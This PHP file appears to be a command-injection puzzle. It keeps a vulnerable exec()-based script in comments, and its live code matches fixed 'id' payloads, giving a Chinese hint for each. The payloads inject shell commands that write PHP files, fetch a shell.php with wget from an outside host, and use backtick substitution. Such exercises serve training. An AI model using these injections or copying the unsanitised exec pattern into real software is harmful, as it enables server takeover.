<?php







/*



<html>
<head><title>Content</title>
 
<link rel="stylesheet" type="text/css" href="style.css"></link>
<link rel="stylesheet" type="text/css" href="styles.css"></link>
<script type="text/javascript" src="common.js"></script><script type="text/javascript" src="css.js"></script><script type="text/javascript" src="standardista-table-sorting.js"></script>
<script type="text/javascript" src="toggle.js">
</script>
<script type="text/javascript">
function updateAppletTarget(q) {
  parent.applet.updateAppletTarget(q);
}
</script>
</head>
<body>
<div id="change">
<?php 
 
 
$id="";
if (isset($_POST["id"])) $id=$_POST["id"];         // GET或POST接收输入id
else if  (isset($_GET["id"])) $id=$_GET["id"];
 
 
if (strlen($id)>0) {
 
// PUBLIC_ID_SEPARATOR
//$id = ereg_replace(":","|",$id);
 
#$id="tesdts.fdkjfls|fjksldaf.fdsfaa";
#echo $id;
 
#note: equivalent function is used in fi.jyu.mit.utils.FileLib.java
#$file = ereg_replace("\\||\\.","_",$id);
$file = ereg_replace("\\||\\:|\\.","_",$id);                            //  ereg_replace -- 如果id传入数据中包含\|:.,_，则ereg_replace正则进入下一个判断。
                                                                        // string ereg_replace ( string pattern, string replacement, string string )
 
#echo $file;
  if (strpos($file,'\\') !== false                                       // \\strpos检索$file中的字符窜是否包含 \\ 则为false
      or strpos($file,'/') !== false
      or strpos($file,':') !== false) die('Not current directory');      // 提示 Not current directory(非当前目录)
 
 
 
// refresh html file and pics
#    exec('make -f Makefile -C .. PICNAME='.$file.' htmlcheck');
#   exec('make PICNAME='.$file.' htmlcheck');
# die('make -i -f skriptit/Makefile DOT_EXEC=bin/ SCRIPTDIR=skriptit/ PICNAME='.$file.' htmlcheck dot2png dot2png_large dot2pdf');
   exec('make -i -f skriptit/Makefile DOT_EXEC=bin/ SCRIPTDIR=skriptit/ PICNAME='.$file.' htmlcheck dot2png dot2png_large dot2pdf');  # $file往上看
#exec('make PICNAME='.$file.' dot2png dot2png_large dot2pdf');
 
 
if ((!file_exists("html/".$file.".html")) || (filesize("html/".$file.".html")==0)) {
    echo "päivitetään "."html/".$file.".html";
?>
<script type="text/javascript">
 updateAppletTarget('<?php echo $id ?>');
</script>
<?php  }
else readfile("html/".$file.".html");  
 
}
 
?>
<!-- disabled temporirarily 
<a href="#" onclick="updateAppletTarget('edit');return false;">Muokkaa</a>
-->
</div>
</body>
</html>







*/













































































//don't look down




























































if(isset($_GET['Submit']))
{

	if($_GET['id']=='aaaa;echo SOMETHING >zzz.php')
	{
		die('你发现 zzz.php 变成了 zzz_php');
	}
	if($_GET['id']=='aaaa;wget www.ccav.com//shell.php')
	{	
		die('Not current directory');
	}
	if($_GET['id']=='aaaa;wget -r 2130706433')
	{	
		die('嗯...还是去看看原始文章吧');
	}
	if($_GET['id']=='aaaa;cat z1 > `cat z2`')
	{	
		die('嗯...最好还是去看看原始文章吧');
	}
	if($_GET['id']=='aaaa;echo > test*php')
	{	
		die('还是去v看看原始文章的评论吧~~~');
	}
	
	die('你确定不想照我提示的那样输入？');

}

?>